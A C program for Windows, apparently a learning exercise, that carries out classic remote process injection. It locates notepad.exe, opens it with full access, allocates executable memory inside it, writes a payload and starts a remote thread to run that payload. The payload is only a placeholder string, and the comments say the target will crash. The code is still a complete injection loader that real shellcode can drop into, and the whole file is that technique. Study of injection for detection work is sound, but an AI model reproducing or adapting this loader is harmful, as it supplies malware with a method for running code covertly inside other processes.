#include <windows.h>
#include <string.h>
#include <stdio.h>
#include <tlhelp32.h>

int main(){
	
	const char* TargetProcess = "notepad.exe";
	DWORD dwPID = 0;
	HANDLE hProcess = NULL;
	
	//Process snapshot taking
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);
	
	if(Process32First(hSnap, &pe32)) {
		do{
			if(_stricmp(pe32.szExeFile, TargetProcess) == 0){
				dwPID = pe32.th32ProcessID;
				break;
			}
		}while (Process32Next(hSnap, &pe32));
	}
	CloseHandle(hSnap);
	
	if(dwPID == 0){
		printf("No process found!\n");
		return 1;
	}
	
	//Process open permissions ask | We will ask for ALL_ACCESS
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);
	
	if(hProcess == NULL) {
		printf("Error opening process. %lu\n", GetLastError());
	} else {
		printf("Successfull. Found the PID: %p\n", hProcess);
	}
	
	//Allocate the memory from given process | notepad.exe | allocate means we need some virtual memory to put our shell code
	SIZE_T PayloadSize = 1024;
	
	LPVOID RemoteBuffer = VirtualAllocEx(hProcess, NULL, PayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	
	if(RemoteBuffer == NULL){
		printf("Error! No virtual memory allocation: %lu\n", GetLastError());
	} else {
		printf("Successfully got the virtual memory! Address: %p\n", RemoteBuffer);
	}
	
	//Inject the shell code in to Virtual Memory
	const char* MyPayload = "Hello i am a shell code!"; //NOTE: after executing this, notepad will get crash, becaouse we don't write shell code to memory. we write string.
	SIZE_T SizeofShellcode = strlen(MyPayload) + 1;
	
	BOOL isWritten = WriteProcessMemory(
	hProcess,
	RemoteBuffer,
	MyPayload,
	SizeofShellcode,
	NULL);
	
	if(!isWritten){
		printf("Shell code written unsuccessfull! Error: %lu", GetLastError());
	} else {
		printf("Shell code written successfull!");
	}
	
	//Create thread for execute the shell code that injected
	
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)RemoteBuffer, NULL, 0, NULL);
	
	if(hThread == NULL){
		printf("Can't execute the shell code. Remote Thread create unsuccessfull! Error: %lu", GetLastError());
	} else {
		printf("Remote thread successfully created!");
		WaitForSingleObject(hThread, INFINITE);
		CloseHandle(hThread);
	}
	
	CloseHandle(hProcess);
	
	return 0;
}